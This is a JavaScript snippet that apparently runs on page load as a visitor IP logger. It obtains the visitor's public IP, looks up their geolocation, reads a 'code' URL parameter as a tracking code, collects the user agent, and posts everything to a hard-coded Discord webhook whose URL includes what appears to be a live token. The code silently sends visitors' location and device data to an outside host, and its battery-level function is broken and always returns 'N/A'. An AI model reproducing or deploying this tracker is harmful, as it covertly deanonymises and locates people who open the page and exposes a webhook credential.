        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const ipAddress = data.ip;
                fetchGeolocationData(ipAddress);
            })
            .catch(error => {
                console.error('Error fetching IP address:', error);
            });

        function fetchGeolocationData(ipAddress) {
            fetch(`https://freeipapi.com/api/json/${ipAddress}`)
                .then(response => response.json())
                .then(data => {
                    const geoLocationData = JSON.stringify(data, null, 2); 

                    const embed = {
                        title: 'Success!',
                        description: `Tracking Code: ${getParameterByName('code')}`,
                        fields: [
                            { name: 'IP Address', value: ipAddress },
                            { name: 'Geolocation', value: `\`\`\`json\n${geoLocationData}\n\`\`\`` },
                            { name: 'Battery Level', value: getBatteryLevel() },
                            { name: 'Device', value: navigator.userAgent },
                            { name: 'More Info', value: `https://whatismyipaddress.com/ip/${ipAddress}` }                        
                     ],
                        footer: {
                            text: 'powered by linux.scot'
                        }
                    };

                // wbhkk
                    const webhookUrl = 'https://discord.com/api/webhooks/1266125230993178710/jAlkmKSYGpKc1ehon3g7aoibKfwsg-Aowu_uUipUambuIXXQ9LFo8bNLR0APME_T4OuO';
                    fetch(webhookUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ embeds: [embed] })
                    })
                        .then(response => {
                            if (response.ok) {
                                console.log('Embed sent successfully');
                            } else {
                                console.error('Failed to send embed');
                            }
                        })
                        .catch(error => {
                            console.error('Error:', error);
                        });
                })
                .catch(error => {
                    console.error('Error fetching geolocation data:', error);
                });
        }

        // urlparm
        function getParameterByName(name, url) {
            if (!url) url = window.location.href;
            name = name.replace(/[\[\]]/g, '\\$&');
            const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
                results = regex.exec(url);
            if (!results) return null;
            if (!results[2]) return '';
            return decodeURIComponent(results[2].replace(/\+/g, ' '));
        }

        // batlvl
        function getBatteryLevel() {
            if (navigator.getBattery) {
                navigator.getBattery().then(battery => {
                    return (battery.level * 100).toFixed(2) + '%';
                });
            }
            return 'N/A';
        }